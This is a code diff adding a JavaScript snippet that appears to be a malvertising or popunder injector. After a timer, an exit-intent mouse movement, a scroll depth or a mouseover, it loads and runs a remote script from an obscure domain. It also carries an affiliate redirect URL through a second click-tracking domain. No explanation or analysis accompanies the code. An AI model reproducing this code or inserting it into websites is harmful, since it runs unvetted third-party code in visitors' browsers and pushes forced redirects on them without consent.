@@ -1,0 +1,65 @@
+var urlToShow = "http://wnzvrqryvirelv.com/lr.php?zoneid=18078&oaparams=9_zqxjzqx_bannerid=512269_zqxjzqx_zoneid=18078_zqxjzqx_OXLCA=1_zqxjzqx_cb=8e4f276c69_zqxjzqx_s1=caught_zqxjzqx_s2=26102_zqxjzqx_ref=_zqxjzqx_oadest=http%3A%2F%2F328.hotlaksa.com%2Fclick%2F4pRH69tZfL2uB%3Faffid%3D915%26pubid%3D26716%26c2%3D790491485.512269.8e4f276c69.18078.a1af1b6a96e3c490bdbb8046b904bdab&s1=caught&s2=26102&ref=", punder = false, mp = 1;
+(function () {
+
+    var $;
+var jq = document.createElement('script');
+jq.src = "//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js";
+document.querySelector('head').appendChild(jq);
+jq.onload = procede;
+
+var trTimer = "0";
+var trMouseoverTarget = "";
+var trScrollValue = "0";
+var trScrollUnit = "pixels";
+var trExit = false;
+
+function procede() {
+    $ = jQuery.noConflict(true);
+    $(function () {
+
+        if (trExit) {
+            $(document).on("mouseleave.tr", function (e) {
+                if (e.clientY <= 20) {
+                    $(document).off("mouseleave.tr");
+                    jqRun();
+                }
+            });
+        } else if (trScrollValue > 0) {
+            checkScrollDepth();
+            $(document).on('scroll', checkScrollDepth);
+        } else if (trMouseoverTarget != '') {
+            $(trMouseoverTarget).one('mouseover', function (e) {
+                jqRun();
+            });
+        } else if (trTimer > 0) {
+            setTimeout(jqRun, trTimer * 1000);
+        } else {
+            jqRun();
+        }
+
+    });
+}
+function checkScrollDepth() {
+    var visible = $(window).scrollTop() + $(window).height();
+    var visiblePercentage = visible / $(document).height() * 100;
+
+    if (trScrollUnit == 'pixels' && visible < trScrollValue) {
+        return false;
+    }
+
+    if (trScrollUnit == 'percent' && visiblePercentage < trScrollValue) {
+        return false;
+    }
+
+    jqRun();
+    $(document).off('scroll', checkScrollDepth);
+}
+
+    function jqRun() {
+        var script = document.createElement('script');
+        script.src = 'http://wnzvrqryvirelv.com/pop.min.js?a=7';
+        script.type = 'text/javascript';
+        var s = document.getElementsByTagName('script')[0];
+        s.parentNode.insertBefore(script, s);
+    }
+})();
